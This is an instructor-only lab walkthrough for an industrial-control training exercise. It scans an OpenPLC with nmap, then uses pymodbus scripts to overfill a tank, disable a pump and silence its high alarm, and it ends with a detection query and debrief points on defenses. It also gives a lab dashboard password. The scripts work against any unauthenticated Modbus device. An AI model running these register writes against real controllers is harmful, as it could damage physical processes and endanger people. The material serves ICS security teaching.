# Walkthrough — SCEN-001: SCADA Modbus Recon & Manipulation

**INSTRUCTOR ONLY — Do not distribute to students**

---

## Phase 1: Reconnaissance

### Step 1: Network Discovery
```bash
# From kali-attacker, scan the OT subnet
nmap -sn 192.168.10x.0/24

# Identify OpenPLC (port 502 open)
nmap -sT -p 502,8080,8086,3000 192.168.10x.0/24
```

Expected: openplc-01 at .10 with ports 502 and 8080 open, historian at .20 with 8086 and 3000.

### Step 2: Modbus Enumeration
```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("192.168.10x.10", port=502)
c.connect()

# Read all coils (FC01)
rr = c.read_coils(0, 8, slave=1)
print(f"Coils: {rr.bits[:8]}")
# Expected: [True, False, False, ...] — Coil 0 = pump ON

# Read input registers (FC04) — sensor values
rr = c.read_input_registers(0, 4, slave=1)
print(f"Input registers: {rr.registers}")
# Expected: [~500-800] — current tank level

# Read holding registers (FC03) — pump speed
rr = c.read_holding_registers(0, 4, slave=1)
print(f"Holding registers 0-3: {rr.registers}")

# Read MW registers (FC03 @ 1024) — setpoints
rr = c.read_holding_registers(1024, 3, slave=1)
print(f"MW registers: {rr.registers}")
# Expected: [750, 900, 200] = setpoint, alarm_high, alarm_low

c.close()
```

### Step 3: Register Map Documentation

Students should produce a table like:

| Address | Type | Value | Description |
|---------|------|-------|-------------|
| Coil 0 | RW | TRUE | Pump enable |
| Coil 1 | RO | FALSE | High alarm |
| Coil 2 | RO | FALSE | Low alarm |
| IR 0 | RO | ~500-800 | Tank level sensor |
| HR 0 | RO | 0-100 | Pump speed output |
| HR 1024 | RW | 750 | Setpoint |
| HR 1025 | RW | 900 | Alarm high |
| HR 1026 | RW | 200 | Alarm low |

---

## Phase 2: Process Manipulation

### Step 4: Setpoint Modification
```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("192.168.10x.10", port=502)
c.connect()

# Write unsafe setpoint (overfill)
c.write_register(1024, 999, slave=1)

# Verify
rr = c.read_holding_registers(1024, 1, slave=1)
print(f"New setpoint: {rr.registers[0]}")  # Should be 999

c.close()
```

**Impact**: Pump runs at full speed trying to reach 99.9% level. Tank overfills. High alarm triggers at 900.

### Step 5: Pump Disable
```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("192.168.10x.10", port=502)
c.connect()

# Disable pump
c.write_coil(0, False, slave=1)

# Verify
rr = c.read_coils(0, 1, slave=1)
print(f"Pump enable: {rr.bits[0]}")  # Should be False

c.close()
```

**Impact**: Pump stops. Tank level begins dropping. Low alarm triggers at 200.

**Note**: The PLC program writes coil 0 each scan cycle based on `pump_enable` variable. The student's write will be overwritten within 50ms unless they continuously write. This is a good teaching moment about PLC scan cycle behavior.

### Step 6: Grafana Observation

Direct students to `http://<historian_ip>:3000` with `admin/LabGrafana2024!`.

The SCADA Process Monitor dashboard shows:
- Tank level gauge dropping when pump is disabled
- Pump speed dropping to 0
- Alarm indicators changing state
- Time-series chart showing the attack timeline

---

## Phase 3: Advanced

### Step 7: Alarm Suppression
```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("192.168.10x.10", port=502)
c.connect()

# Stealthy attack: raise alarm threshold above max, then overfill
c.write_register(1025, 1000, slave=1)  # Alarm high → above sensor range
c.write_register(1024, 999, slave=1)   # Setpoint → overfill

# Now the pump runs at full speed and no alarm fires
rr = c.read_coils(1, 1, slave=1)
print(f"High alarm: {rr.bits[0]}")  # Should remain False despite overfill

c.close()
```

**Teaching point**: This demonstrates why monitoring threshold changes is critical. An IDS watching for register writes to addresses 1024-1026 would detect this. InfluxDB query to detect threshold change:

```flux
from(bucket: "process-data")
  |> range(start: -1h)
  |> filter(fn: (r) => r._field == "alarm_high_threshold")
  |> difference()
  |> filter(fn: (r) => r._value != 0)
```

---

## Debrief Discussion Points

1. **Why does Modbus have no authentication?** Designed in 1979 for serial links within physically secured facilities. TCP/IP adaptation (1999) preserved the simplicity.

2. **What defenses exist?** Network segmentation (primary), Modbus-aware IDS (Snort/Suricata rules), application whitelisting on PLCs, monitoring for anomalous register writes.

3. **Real-world parallels**: Oldsmar water treatment (2021) — attacker changed NaOH setpoint via VNC. TRITON/TRISIS (2017) — targeted safety instrumented systems.

4. **Why can't we just add TLS?** Many PLCs lack the processing power. Protocol migration is multi-decade in ICS environments. Air-gapping and monitoring are more practical near-term.
